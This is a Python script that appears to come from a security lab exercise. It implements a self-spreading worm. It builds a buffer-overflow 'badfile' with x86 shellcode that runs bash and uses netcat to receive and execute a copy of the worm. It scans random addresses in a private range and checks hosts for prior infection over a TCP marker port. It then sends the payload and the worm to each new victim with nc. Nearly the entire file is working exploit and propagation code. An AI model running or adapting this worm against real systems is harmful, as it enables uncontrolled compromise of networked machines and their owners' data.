#!/bin/env python3

import threading
import socket
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8080 > /home/worm.py;                              "
   " chmod +x /home/worm.py; /home/worm.py;                    *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   base_pointer   = 0xffffd5e8
   buffer_address = 0xffffd578

   offset = base_pointer - buffer_address + 4
   ret    = buffer_address + 500 - len(shellcode)

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   return "10.{X}.0.{Y}".format(X=randint(151, 155), Y=randint(70, 80))

# Check if the target is alive
def isAlive(targetIP):
   response = subprocess.run([f"ping -q -c 1 -W 1 {targetIP}"] , capture_output=True, text=True, check=False, shell=True) # -c1: send 1 packet, -W1: wait 1 second
   result = response.returncode

   if result == -1:
      return False
   else:
      return True

def runTCPServer():
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('0.0.0.0', 17777)
    sock.bind(server_address)
    sock.listen(1)

    while True:
        conn, address = sock.accept()
        data  = conn.recv(1024)
        if data == b'AreUWorm':
            conn.sendall(b'IamWorm')
        conn.close()

def checkIfInfected(targetIP):
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (targetIP, 17777)
    sock.settimeout(3)

    try:
        sock.connect(server_address)
        sock.sendall(b'AreUWorm')
        data = sock.recv(1024)
        if data == b'IamWorm':
            return True
    except:
        pass
    finally:
        sock.close()

    return False


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# run the TCP server for preventing self infection in another thread
tcp_server_thread = threading.Thread(target=runTCPServer, args=())
tcp_server_thread.daemon = True # this thread will die when the main thread dies
tcp_server_thread.start()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Check if the target is alive
    print(f"**********************************", flush=True)
    print(f">>>>> Checking if {targetIP} is alive <<<<<", flush=True)
    print(f"**********************************", flush=True)

    if isAlive(targetIP) == False:
        continue

    # Check if the target is already infected
    print(f"**********************************", flush=True)
    print(f">>>>> Checking if {targetIP} is infected <<<<<", flush=True)
    print(f"**********************************", flush=True)

    if checkIfInfected(targetIP) == True:
        continue

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(2)

    # Send the worm to the target host
    subprocess.run([f"cat /home/worm.py | nc -w5 {targetIP} 8080"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 
